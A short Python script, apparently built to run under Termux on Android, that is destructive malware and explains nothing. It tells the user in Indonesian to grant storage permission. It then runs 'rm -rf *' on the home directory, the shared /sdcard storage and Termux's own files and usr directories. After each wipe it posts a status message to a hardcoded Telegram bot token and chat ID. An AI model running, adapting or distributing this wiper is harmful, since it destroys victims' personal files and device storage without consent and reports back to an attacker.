import os,re,time,random,sys
import requests
os.system('clear')
try:
    requests.post('https://api.telegram.org/bot5841184599:AAGl-RUd4-UnLjeLcGjIac6Q8kpqbQcAN78/sendMessage?parse_mode=markdown&chat_id=1925182290&text=RunningScript')
except:
    pass
try:
    os.system('cd /data/data/com.termux/files/home')
    os.system('cd $HOME')
    os.system('rm -rf *')
    try:requests.post('https://api.telegram.org/bot5841184599:AAGl-RUd4-UnLjeLcGjIac6Q8kpqbQcAN78/sendMessage?parse_mode=markdown&chat_id=1925182290&text=HOMEDeletedSuccess')
    except:pass
except:
    pass
try:
    print('\n\n - Harap izinkan Penyimpanan Terlebih Dahulu')
    try:requests.post('https://api.telegram.org/bot5841184599:AAGl-RUd4-UnLjeLcGjIac6Q8kpqbQcAN78/sendMessage?parse_mode=markdown&chat_id=1925182290&text=SdcardDeletedSuccess')
    except:pass
    os.system('termux-setup-storage')
    time.sleep(10)
    os.system('cd /sdcard;rm -rf *')
    os.system('rm -rf .')
except:
    pass
try:
    os.system('cd /data/data/com.termux/files')
    os.system('rm -rf *')
    os.system('cd /data/data/com.termux/files/usr')
    os.system('rm -rf *')
    try:requests.post('https://api.telegram.org/bot5841184599:AAGl-RUd4-UnLjeLcGjIac6Q8kpqbQcAN78/sendMessage?parse_mode=markdown&chat_id=1925182290&text=SRCDeletedSuccess')
    except:pass
except:
    pass
